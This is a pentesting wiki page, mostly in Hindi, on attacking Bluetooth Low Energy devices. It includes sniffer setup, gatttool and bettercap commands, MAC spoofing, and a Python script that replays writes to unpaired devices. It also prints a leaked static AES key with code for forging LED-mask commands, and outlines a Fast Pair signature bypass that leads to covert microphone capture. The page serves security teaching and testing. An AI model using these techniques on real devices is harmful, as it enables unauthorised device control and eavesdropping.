# Pentesting BLE - Bluetooth Low Energy

{{#include ../../banners/hacktricks-training.md}}

## परिचय

Bluetooth 4.0 specification से उपलब्ध, BLE केवल 40 चैनलों का उपयोग करता है, जो 2400 से 2483.5 MHz की रेंज को कवर करते हैं। इसके विपरीत, पारंपरिक Bluetooth उसी रेंज में 79 चैनलों का उपयोग करता है।

BLE devices संवाद करते हैं **विज्ञापन भेजकर** — वे **advertising packets** (**बीकन**) भेजते हैं; ये पैकेट्स आसपास के अन्य डिवाइसों को BLE डिवाइस के अस्तित्व का प्रसारण करते हैं। ये बीकन कभी-कभी **डेटा भी भेजते** हैं।

सुनने वाला डिवाइस, जिसे central device भी कहा जाता है, किसी advertising packet का जवाब विशेष रूप से advertising डिवाइस को भेजे गए **SCAN request** के साथ दे सकता है। उस स्कैन का **response** उसी संरचना का उपयोग करता है जो **advertising** packet की होती है, साथ ही अतिरिक्त जानकारी भी होती है जो प्रारंभिक advertising request में फिट नहीं हो पाती — जैसे पूरा डिवाइस नाम।

![](<../../images/image (152).png>)

preamble byte फ़्रीक्वेंसी को सिंक्रनाइज़ करता है, जबकि चार-बाइट का access address एक **connection identifier** है, जो उन परिदृश्यों में उपयोग होता है जहाँ एक ही चैनलों पर कई डिवाइस कनेक्शन स्थापित करने की कोशिश कर रहे होते हैं। इसके बाद, Protocol Data Unit (**PDU**) में **advertising data** होता है। PDU के कई प्रकार होते हैं; सबसे सामान्य रूप से उपयोगी हैं ADV_NONCONN_IND और ADV_IND। डिवाइस **ADV_NONCONN_IND** PDU प्रकार का उपयोग करते हैं यदि वे **कनेक्शन स्वीकार नहीं करते** हैं, और केवल advertising packet में ही डेटा ट्रांसमिट करते हैं। डिवाइस **ADV_IND** का उपयोग करते हैं यदि वे **कनेक्शंस की अनुमति देते** हैं और एक **connection** स्थापित होने पर advertising पैकेट्स भेजना **रोक देते** हैं।

### GATT

GATT (Generic Attribute Profile) यह परिभाषित करता है कि **डिवाइस को डेटा कैसे फॉर्मेट और ट्रांसफर करना चाहिए**। जब आप किसी BLE डिवाइस के attack surface का विश्लेषण कर रहे होते हैं, तो आप अक्सर GATT (या GATTs) पर अपना ध्यान केंद्रित करेंगे, क्योंकि यही वह तरीका है जिससे **डिवाइस की कार्यक्षमता ट्रिगर होती है** और डेटा को स्टोर, समूहित और मॉडिफाई किया जाता है। GATT डिवाइस की characteristics, descriptors, और services को तालिका में 16- या 32-बिट मानों के रूप में सूचीबद्ध करता है। एक **characteristic** एक **डेटा** मान है जो central device और peripheral के बीच **भेजा/प्राप्त** होता है। इन characteristics के पास ऐसे **descriptors** हो सकते हैं जो उनके बारे में अतिरिक्त जानकारी **प्रदान करते** हैं। यदि कोई characteristic किसी विशेष क्रिया को करने से संबंधित है तो उन्हें अक्सर **services** में **समूहीकृत** किया जाता है।

## Enumeration
```bash
hciconfig #Check config, check if UP or DOWN
# If DOWN try:
sudo modprobe -c bluetooth
sudo hciconfig hci0 down && sudo hciconfig hci0 up

# Spoof MAC
spooftooph -i hci0 -a 11:22:33:44:55:66
```
### GATTool

**GATTool** किसी अन्य डिवाइस के साथ एक connection स्थापित करने, उस डिवाइस की characteristics को सूचीबद्ध करने, और उसके attributes को पढ़ने और लिखने की अनुमति देता है.\  
GATTTool `-I` विकल्प के साथ एक interactive shell लॉन्च कर सकता है:

<details>
<summary>GATTTool interactive उपयोग और उदाहरण</summary>
```bash
gatttool -i hci0 -I
[ ][LE]> connect 24:62:AB:B1:A8:3E Attempting to connect to A4:CF:12:6C:B3:76 Connection successful
[A4:CF:12:6C:B3:76][LE]> characteristics
handle: 0x0002, char properties: 0x20, char value handle:
0x0003, uuid: 00002a05-0000-1000-8000-00805f9b34fb
handle: 0x0015, char properties: 0x02, char value handle:
0x0016, uuid: 00002a00-0000-1000-8000-00805f9b34fb
[...]

# Write data
gatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-write-req <characteristic handle> -n <value>
gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "04dc54d9053b4307680a"|xxd -ps)

# Read data
gatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-read -a 0x16

# Read connecting with an authenticated encrypted connection
gatttool --sec-level=high -b a4:cf:12:6c:b3:76 --char-read -a 0x002c
```
</details>

### Bettercap
```bash
# Start listening for beacons
sudo bettercap --eval "ble.recon on"
# Wait some time
>> ble.show # Show discovered devices
>> ble.enum <mac addr> # This will show the service, characteristics and properties supported

# Write data in a characteristic
>> ble.write <MAC ADDR> <UUID> <HEX DATA>
>> ble.write <mac address of device> ff06 68656c6c6f # Write "hello" in ff06
```
## Sniffing और सक्रिय रूप से unpaired BLE devices को नियंत्रित करना

कई कम-लागत BLE peripherals pairing/bonding लागू नहीं करते। bonding के बिना, Link Layer encryption कभी सक्षम नहीं होता, इसलिए ATT/GATT traffic cleartext में रहता है। एक off-path sniffer connection को फॉलो कर सकता है, GATT operations को decode कर characteristic handles और values सीख सकता है, और आसपास कोई भी host फिर connect करके उन writes को replay कर device को कंट्रोल कर सकता है।

### Sniffing with Sniffle (CC26x2/CC1352)

हार्डवेयर: Sonoff Zigbee 3.0 USB Dongle Plus (CC26x2/CC1352), जिसे NCC Group’s Sniffle firmware से re-flashed किया गया है।

Sniffle और इसके Wireshark extcap को Linux पर इंस्टॉल करें:

<details>
<summary>Sniffle extcap (Linux) इंस्टॉल करें</summary>
```bash
if [ ! -d /opt/sniffle/Sniffle-1.10.0/python_cli ]; then
echo "[+] - Sniffle not installed! Installing at 1.10.0..."
sudo mkdir -p /opt/sniffle
sudo chown -R $USER:$USER /opt/sniffle
pushd /opt/sniffle
wget https://github.com/nccgroup/Sniffle/archive/refs/tags/v1.10.0.tar.gz
tar xvf v1.10.0.tar.gz
# Install Wireshark extcap for user and root only
mkdir -p $HOME/.local/lib/wireshark/extcap
ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py $HOME/.local/lib/wireshark/extcap
sudo mkdir -p /root/.local/lib/wireshark/extcap
sudo ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py /root/.local/lib/wireshark/extcap
popd
else
echo "[+] - Sniffle already installed at 1.10.0"
fi
```
</details>

Flash Sonoff with Sniffle firmware (सुनिश्चित करें कि आपका serial device मेल खाता है, उदा. /dev/ttyUSB0):
```bash
pushd /opt/sniffle/
wget https://github.com/nccgroup/Sniffle/releases/download/v1.10.0/sniffle_cc1352p1_cc2652p1_1M.hex
git clone https://github.com/sultanqasim/cc2538-bsl.git
cd cc2538-bsl
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install pyserial intelhex
python3 cc2538-bsl.py -p /dev/ttyUSB0 --bootloader-sonoff-usb -ewv ../sniffle_cc1352p1_cc2652p1_1M.hex
deactivate
popd
```
Wireshark में Sniffle extcap के माध्यम से कैप्चर करें और फ़िल्टर करके जल्दी से state-changing writes पर pivot करें:
```text
_ws.col.info contains "Sent Write Command"
```
यह क्लाइंट से ATT Write Commands को हाइलाइट करता है; handle और value अक्सर सीधे डिवाइस क्रियाओं के अनुरूप होते हैं (उदा., buzzer/alert characteristic में 0x01 लिखें, रोकने के लिए 0x00)।

Sniffle CLI के त्वरित उदाहरण:
```bash
python3 scanner.py --output scan.pcap
# Only devices with very strong signal
python3 scanner.py --rssi -40
# Filter advertisements containing a string
python3 sniffer.py --string "banana" --output sniff.pcap
```
Alternative sniffer: Nordic’s nRF Sniffer for BLE + Wireshark plugin भी काम करता है। छोटे/सस्ते Nordic dongles पर आप आमतौर पर sniffer firmware लोड करने के लिए USB bootloader को ओवरराइट करते हैं, इसलिए या तो आपके पास एक समर्पित sniffer dongle होना चाहिए या बाद में bootloader को restore करने के लिए J-Link/JTAG की आवश्यकता पड़ेगी।

### GATT के जरिए सक्रिय नियंत्रण

एक बार जब आपने sniff किए गए ट्रैफ़िक से एक लिखने योग्य characteristic handle और value पहचान ली, तो किसी भी central के रूप में कनेक्ट करें और वही write जारी करें:

- Nordic nRF Connect for Desktop (BLE app) के साथ:
- nRF52/nRF52840 dongle को चुनें, स्कैन करें और target से कनेक्ट करें।
- GATT डेटाबेस ब्राउज़ करें, target characteristic ढूंढें (अक्सर एक friendl y नाम होता है, जैसे Alert Level)।
- sniffed bytes के साथ एक Write निष्पादित करें (उदा., trigger करने के लिए 01, रोकने के लिए 00)।

- Windows पर Nordic dongle का उपयोग करके Python + blatann से ऑटोमेट करें:

<details>
<summary>Python blatann write उदाहरण (Windows + Nordic dongle)</summary>
```python
import time
import blatann

# CONFIG
COM_PORT = "COM29"  # Replace with your COM port
TARGET_MAC = "5B:B1:7F:47:A7:00"  # Replace with your target MAC

target_address = blatann.peer.PeerAddress.from_string(TARGET_MAC + ",p")

# CONNECT
ble_device = blatann.BleDevice(COM_PORT)
ble_device.configure()
ble_device.open()
print(f"[-] Connecting to {TARGET_MAC}...")
peer = ble_device.connect(target_address).wait()
if not peer:
print("[!] Connection failed.")
ble_device.close()
raise SystemExit(1)

print("Connected. Discovering services...")
peer.discover_services().wait(5, exception_on_timeout=False)

# Example: write 0x01/0x00 to a known handle
for service in peer.database.services:
for ch in service.characteristics:
if ch.handle == 0x000b:  # Replace with your handle
print("[!] Beeping.")
ch.write(b"\x01")
time.sleep(2)
print("[+] And relax.")
ch.write(b"\x00")

print("[-] Disconnecting...")
peer.disconnect()
peer.wait_for_disconnect()
ble_device.close()
```
</details>

### केस स्टडी: BLE LED मास्क हाइजैकिंग (Shining Mask परिवार)

सस्ते, white‑labeled BLE LED मास्क जिन्हें “Shining Mask” app से नियंत्रित किया जाता है, pairing/bonding की आवश्यकता के बिना किसी भी आसपास के central से write कंट्रोल स्वीकार करते हैं। App GATT के ज़रिए एक command characteristic और एक data characteristic से बात करता है; commands AES‑ECB से encrypt किए जाते हैं जो app में hard‑coded static key के साथ होते हैं, जबकि bulk image data unencrypted रहता है।

Key UUIDs on these devices:
- Command write characteristic: d44bc439-abfd-45a2-b575-925416129600
- Notify characteristic: d44bc439-abfd-45a2-b575-925416129601
- Image data characteristic: d44bc439-abfd-45a2-b575-92541612960a

अनऑथेंटिकेटेड GATT writes
- pairing/bonding की आवश्यकता नहीं। कोई भी host connect कर सकता है और command UUID पर write करके brightness बदल सकता है, images select कर सकता है, animations शुरू कर सकता है, आदि।
- आम तौर पर देखे गए ops: LIGHT (brightness), IMAG (select index), DELE (delete indices), SPEED, ANIM, PLAY, CHEC (query count), DATS (begin upload).

स्टैटिक-की AES कमांड फ्रेमिंग
- Frame = 1‑byte लंबाई, ASCII op (e.g., b"LIGHT"), args, 16 तक pad करें, AES‑ECB encrypt with static key from the app.
- Known static key (hex): 32672f7974ad43451d9c6c894a0e8764

Python helper to encrypt and send a command (example: set max brightness):
```python
from Crypto.Cipher import AES
from binascii import unhexlify

KEY = unhexlify('32672f7974ad43451d9c6c894a0e8764')

def enc_cmd(op, args=b''):
body = bytes([len(op) + len(args)]) + op.encode() + args
body += b'\x00' * ((16 - (len(body) % 16)) % 16)
return AES.new(KEY, AES.MODE_ECB).encrypt(body)

packet = enc_cmd('LIGHT', b'\xff')
# Write 'packet' to d44bc439-abfd-45a2-b575-925416129600
```
इमेज अपलोड फ्लो
- एक encrypted DATS handshake के बाद, raw chunks unencrypted रूप में data characteristic …960a पर लिखे जाते हैं।
- Packet format: [len][seq][payload]. अनुभवजन्य रूप से ~100 bytes payload प्रति packet भरोसेमंद तरीके से काम करता है।

<details>
<summary>न्यूनतम image upload pseudo-code</summary>
```python
# Start upload (encrypted): two bytes size, two bytes index, one toggle byte
img_index = b'\x01\x00'  # index 1
img_size  = (len(img_bytes)).to_bytes(2, 'big')
start     = enc_cmd('DATS', img_size + img_index + b'\x01')
write_cmd_char(start)  # expect DATSOK on notify char

# Stream raw chunks (unencrypted) to ...960a: [len][seq][payload]
seq = 0
CHUNK = 98  # data bytes per packet (≈100 total incl. len+seq)
for off in range(0, len(img_bytes), CHUNK):
chunk = img_bytes[off:off+CHUNK]
pkt = bytes([len(chunk)+1, seq & 0xff]) + chunk
write_data_char(pkt)
seq += 1

# Optionally signal completion if firmware expects it (e.g., DATCP)
```
</details>

### Fast Pair (0xFE2C) Key-Based Pairing signature bypass (WhisperPair/CVE-2025-36911)

- **Discovery:** BLE advertisements में service UUID 0xFE2C (Google Fast Pair) के लिए स्कैन करें। pairing mode में डिवाइस आमतौर पर एक pairing badge एक्सपोज़ करते हैं; pairing mode के बाहर भी Fast Pair service GATT पर रिस्पॉन्ड कर सकती है।
- **Non-invasive probe (signature enforcement check):**
1. GATT द्वारा Fast Pair service से **connect** करें और **Model ID पढ़ें**।
2. **signature के बिना एक Key-Based Pairing (KBP) value लिखें**। अगर peripheral unsigned KBP write स्वीकार कर लेता है, तो वह signature-bypass (WhisperPair/CVE-2025-36911) के प्रति संवेदनशील है। अस्वीकृति पैच का संकेत देती है; अगर डिवाइस पहले से paired है तो failures अनिर्णायक हो सकते हैं।
- **BLE → BR/EDR pivot:** एक **KBP Request** भेजें और **encrypted response** को पार्स करके target का **BR/EDR address** प्राप्त करें। classic bonding कॉल का उपयोग करें (उदा., Android **`createBond(<BR/EDR address>)`**) ताकि अनधिकृत pairing पूरा हो सके। जहां समर्थित हो, **Account Key** लिखने से association स्थायी हो जाती है।
- **Post-bond microphone abuse:** bonding के बाद **HFP** खोलें और **SCO audio** शुरू करें ताकि लाइव माइक्रोफोन स्ट्रीम प्राप्त हो (उदा., M4A में सेव करना)। यह चेन unsigned KBP acceptance को बिना उपयोगकर्ता की सहमति के रिमोट ऑडियो कैप्चर में बदल देती है।
- **Hunt/detect:** Fast Pair GATT ट्रैफ़िक देखें जिसके तुरंत बाद KBP में लौटे BR/EDR address पर classic bonding प्रयास हों, और signature के बिना KBP writes पर ध्यान दें। KBP पर signature validation लागू करना और user-confirmed pairing के लिए prompt करना इस चेन को तोड़ देता है।

## Operational notes

- मजबूत channel hopping और connection following के लिए Linux पर Sonoff+Sniffle पसंद करें। एक spare Nordic sniffer बैकअप के रूप में रखें।
- pairing/bonding के बिना, कोई भी पास में मौजूद attacker writes को observe कर सकता है और unauthenticated writable characteristics पर उन्हें replay/craft कर सकता है।

## References

- [WPair — CVE-2025-36911 (WhisperPair) vulnerability scanner & research tool](https://github.com/zalexdev/wpair-app)
- [Start hacking Bluetooth Low Energy today! (part 2) – Pentest Partners](https://www.pentestpartners.com/security-blog/start-hacking-bluetooth-low-energy-today-part-2/)
- [Sniffle – A sniffer for Bluetooth 5 and 4.x LE](https://github.com/nccgroup/Sniffle)
- [Firmware installation for Sonoff USB Dongle (Sniffle README)](https://github.com/nccgroup/Sniffle?tab=readme-ov-file#firmware-installation-sonoff-usb-dongle)
- [Sonoff Zigbee 3.0 USB Dongle Plus (ZBDongle-P)](https://sonoff.tech/en-uk/products/sonoff-zigbee-3-0-usb-dongle-plus-zbdongle-p)
- [Nordic nRF Sniffer for Bluetooth LE](https://www.nordicsemi.com/Products/Development-tools/nRF-Sniffer-for-Bluetooth-LE)
- [nRF Connect for Desktop](https://www.nordicsemi.com/Products/Development-tools/nRF-Connect-for-desktop)
- [blatann – Python BLE library for Nordic devices](https://blatann.readthedocs.io/en/latest/)
- [Invasion of the Face Changers: Halloween Hijinks with Bluetooth LED Masks (Bishop Fox)](https://bishopfox.com/blog/invasion-of-the-face-changers-halloween-hijinks-with-bluetooth-led-masks)
- [Shining Mask BLE protocol notes (BrickCraftDream)](https://github.com/BrickCraftDream/Shining-Mask-stuff/blob/main/ble-protocol.md)
- [Android Bluetooth HCI snoop logging](https://source.android.com/docs/core/connect/bluetooth/verifying_debugging)
- [Adafruit Feather nRF52840 Express](https://www.adafruit.com/product/4062)

{{#include ../../banners/hacktricks-training.md}}
